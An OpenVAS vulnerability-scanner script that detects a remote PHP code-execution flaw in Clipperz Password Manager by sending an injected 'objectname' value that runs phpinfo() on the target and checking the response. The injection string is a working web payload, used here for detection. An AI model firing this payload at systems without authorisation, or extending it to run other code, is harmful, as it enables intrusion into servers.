###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_clipperz_password_manager_rce_vuln.nasl 6769 2017-07-20 09:56:33Z teissa $
#
# Clipperz Password Manager 'objectname' Remote Code Execution Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804607");
  script_version("$Revision: 6769 $");
  script_bugtraq_id(67498);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-07-20 11:56:33 +0200 (Thu, 20 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-05-26 14:49:09 +0530 (Mon, 26 May 2014)");
  script_name("Clipperz Password Manager 'objectname' Remote Code Execution Vulnerability");

  script_tag(name : "summary" , value : "This host is running Clipperz Password Manager and is prone to remote code
  execution vulnerability.");
  script_tag(name : "vuldetect" , value : "Send the crafted HTTP GET request and check is it possible to execute an
  arbitrary php code.");
  script_tag(name : "insight" , value : "The error exists as input passed via the 'objectname' parameter is not properly
  sanitized upon submission to the /backend/php/src/setup/rpc.php script");
  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to execute arbitrary php code.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Clipperz Password Manager.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/126713");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/clipperz-password-manager-code-execution");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
pwmPort = "";
pwmReq = "";
pwmRes = "";

## Get HTTP Port
pwmPort = get_http_port(default:80);

## Check the support for php
if(!can_host_php(port:pwmPort)){
  exit(0);
}

## Iterate over the possible paths
foreach dir (make_list_unique("/", "/clipperz", "/password-manager-master", "/pass-mgr", cgi_dirs(port:pwmPort)))
{

  if(dir == "/") dir = "";

  pwmReq = http_get(item:string(dir, "/beta/index.html"), port:pwmPort);
  pwmRes = http_keepalive_send_recv(port:pwmPort, data:pwmReq);

  if(pwmRes && ">Clipperz" >< pwmRes)
  {
    ## Construct the attack request
    url = dir + "/backend/php/src/setup/rpc.php?objectname=Xmenu();print_r(phpinfo());die";

    ## Confirm the Exploit
    if(http_vuln_check(port:pwmPort, url:url, check_header:TRUE,
       pattern:">PHP Version", extra_check: make_list(">Loaded Modules",
       ">HTTP Headers Information<")))
    {
      report = report_vuln_url( port:pwmPort, url:url );
      security_message(port:pwmPort, data:report);
      exit(0);
    }
  }
}

exit(99);